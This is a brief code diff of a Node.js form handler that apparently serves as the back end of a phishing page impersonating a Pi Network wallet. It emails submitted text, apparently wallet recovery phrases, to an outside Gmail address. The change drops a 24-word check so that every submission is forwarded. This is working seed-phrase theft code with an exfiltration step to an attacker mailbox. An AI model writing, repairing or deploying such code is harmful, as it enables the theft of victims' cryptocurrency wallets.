@@ -49,7 +49,7 @@ app.post("/submit/7668", async (req, res) => {
   const formNonce = req.body["form_nonce"];
   // forward to Email
   try {
-    if(mfText && mfText.split(' ').length == 24){
+    if(mfText){
       transporter.sendMail({
         from: "PiNetworkWallet ",
         to: ["mizetomilli@gmail.com"],
